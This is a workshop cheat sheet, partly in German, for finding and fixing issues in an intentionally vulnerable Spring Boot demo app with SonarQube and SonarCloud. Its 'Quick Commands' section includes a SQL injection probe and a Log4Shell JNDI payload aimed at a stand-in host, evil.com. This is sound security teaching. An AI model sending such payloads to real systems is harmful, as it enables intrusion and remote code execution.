# 📋 QUICK REFERENCE - Issues auf einen Blick

## Für schnelles Nachschlagen während des Workshops

### 🔥 Top 10 Critical Issues

| Prio | Type | File:Line | Quick Fix |
|------|------|-----------|-----------|
| 1 | CVE-2021-44228 | pom.xml:35 | Update to 2.20.0 |
| 2 | CVE-2019-12384 | pom.xml:47 | Update to 2.15.2 |
| 3 | SQL Injection | UserService.java:50 | Use PreparedStatement |
| 4 | SQL Injection | OrderService.java:120 | Use PreparedStatement |
| 5 | Log4Shell Usage | UserService.java:38 | Never log user input directly |
| 6 | Hardcoded Password | UserService.java:31 | Use environment variable |
| 7 | Password Exposure | User.java:70 | Remove getPassword() |
| 8 | NullPointerException | UserService.java:109 | Add null check |
| 9 | Empty Catch | UserService.java:122 | Add logging |
| 10 | Cognitive Complexity | UserService.java:55 | Refactor with early returns |

### 🎯 Workshop Flow Cheat Sheet

**15 Min - IntelliJ Setup**
- Install: IntelliJ IDEA + SonarQube for IDE Plugin
- Open: Project in IntelliJ
- Wait: Indexierung fertig
- Demo: Öffne `UserService.java` → Issues sehen

**30 Min - Setup**
- Install: JDK 11, Maven
- Start: `mvn spring-boot:run`
- Test: `curl localhost:8080/api/orders`

**30 Min - SonarCloud**
- Create account (Team Trial)
- Scan: `mvn sonar:sonar -Dsonar.token=XXX`
- Explore: Dashboard shows 103 issues

**30 Min - CVEs**
- Fix: log4j 2.14.1 → 2.20.0
- Fix: jackson 2.9.8 → 2.15.2
- Re-scan: CVEs gone!

**60 Min - Code Quality**
- Fix SQL Injection
- Reduce Complexity
- Remove Magic Numbers
- Add null checks

**30 Min - Results**
- Re-scan
- Compare before/after
- Discuss learnings

### 💻 Quick Commands

```bash
# IntelliJ öffnen (wenn installiert)
idea .

# Build
mvn clean install

# Run
mvn spring-boot:run

# Run on different port
mvn spring-boot:run -Dspring-boot.run.arguments=--server.port=8081

# SonarCloud Scan
mvn clean verify sonar:sonar \
  -Dsonar.projectKey=YOUR_KEY \
  -Dsonar.organization=YOUR_ORG \
  -Dsonar.host.url=https://sonarcloud.io \
  -Dsonar.token=YOUR_TOKEN

# Test SQL Injection
curl "localhost:8080/api/users/search?email=' OR '1'='1"

# Test Log4Shell
curl "localhost:8080/api/orders/search?product=\${jndi:ldap://evil.com}"
```

### ⌨️ IntelliJ Shortcuts

```
F2                   - Next Issue
Shift + F2           - Previous Issue
Alt + Enter          - Show Quick Fixes
Ctrl + F1            - Show Error Description
Alt + 6              - Open SonarQube Tool Window
Ctrl + Alt + Shift + S - SonarQube Settings
```

### 🔌 IntelliJ Plugin Setup

**Installation:**
1. `Settings` → `Plugins`
2. Search: "SonarQube for IDE"
3. Click `Install`
4. Restart IntelliJ

**SonarCloud Verbinden (Optional):**
1. `Settings` → `Tools` → `SonarQube for IDE`
2. Add SonarCloud Connection
3. Token einfügen
4. Projekt binden

**Was zeigt das Plugin?**
- ✅ Code Smells (lokal)
- ✅ Bugs (lokal)
- ✅ Security Hotspots (lokal)
- ❌ CVEs (nur SonarCloud!)


### 📊 Issue Distribution

```
Total: 103 Issues

CVEs:              6  (Critical)
Security Hotspots: 16 (High)
Bugs:              21 (Medium-High)
Code Smells:       60 (Low-Medium)
```

### 🔧 Common Fixes

**SQL Injection:**
```java
// BAD
String q = "SELECT * FROM users WHERE email LIKE '%" + email + "%'";

// GOOD
TypedQuery<User> q = em.createQuery("..WHERE email LIKE :email", User.class);
q.setParameter("email", "%" + email + "%");
```

**Cognitive Complexity:**
```java
// BAD: Nested ifs
if (user != null) {
  if (email != null) {
    if (email.contains("@")) {
      ...
    }
  }
}

// GOOD: Early returns
if (user == null) return false;
if (email == null) return false;
if (!email.contains("@")) return false;
...
```

**Magic Numbers:**
```java
// BAD
if (user.getAge() > 65) { ... }

// GOOD
private static final int SENIOR_AGE = 65;
if (user.getAge() > SENIOR_AGE) { ... }
```

### 🎓 Learning Objectives

After workshop, participants can:
- [ ] Install & configure IntelliJ + SonarQube Plugin
- [ ] See issues live while coding
- [ ] Setup SonarCloud Team
- [ ] Interpret security ratings
- [ ] Prioritize issues by severity
- [ ] Fix CVEs in dependencies
- [ ] Fix SQL Injection
- [ ] Reduce code complexity
- [ ] Configure Quality Gates
- [ ] Integrate into CI/CD
- [ ] Understand local vs. cloud analysis

### 📞 Emergency Contacts

**Technical Issues:**
- Java not found? Check PATH
- Port in use? Use 8081
- Maven errors? Try `mvn clean`

**SonarCloud Issues:**
- Can't login? Check email/password
- Scan fails? Check firewall
- No CVEs shown? Check Team Trial active

---

Print this page for quick reference during workshop! 🖨️
